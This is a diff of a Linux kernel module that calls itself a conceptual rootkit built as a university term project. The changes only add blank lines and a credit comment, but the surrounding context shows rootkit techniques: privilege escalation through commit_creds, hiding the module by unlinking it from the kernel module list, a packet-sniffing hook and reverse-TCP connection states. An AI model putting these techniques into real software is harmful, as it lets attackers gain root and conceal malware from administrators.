@@ -52,6 +52,7 @@ MODULE_DESCRIPTION("A conceptual rootkit. Term project for Shiva Azadegan's COSC
 #define CONNECTED      1				/* r-TCP connection established.     */
 #define DISCONNECTED   0				/* r-TCP connection not established. */
 
+
 // Memory segment context switch
 mm_segment_t old_fs;
 
@@ -202,6 +203,7 @@ void send_buffer(struct socket *sock, const char *buffer, size_t length)
 	set_fs(old_fs);
 }
 */
+
 
 /**
  * TODO: 
@@ -580,6 +582,8 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 }
 
 
+// Credit goes to Beraldo Leal
+// beraldo@ime.usp.br
 void start_listen(void)
 {
 	printk("Starting network sniffing.\n");
@@ -588,6 +592,7 @@ void start_listen(void)
 	net_proto.func = packet_rcv;
 	dev_add_pack(&net_proto);
 }
+
 
 // Credit goes to maK_it for this function.
 // Corrected in order to accommodate kernel header file update (add .val).
@@ -606,11 +611,13 @@ void get_root(void)
 	commit_creds(credentials);
 }
 
+
 void hide_me(void)
 {
 	list_del_init(&__this_module.list);
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 }
+
 
 /*
 // Used for initial testing of call_usermodehelper().
@@ -644,6 +651,7 @@ void test(void)
 	set_fs(old_fs);
 }
 */
+
 
 /**
  * TODO:
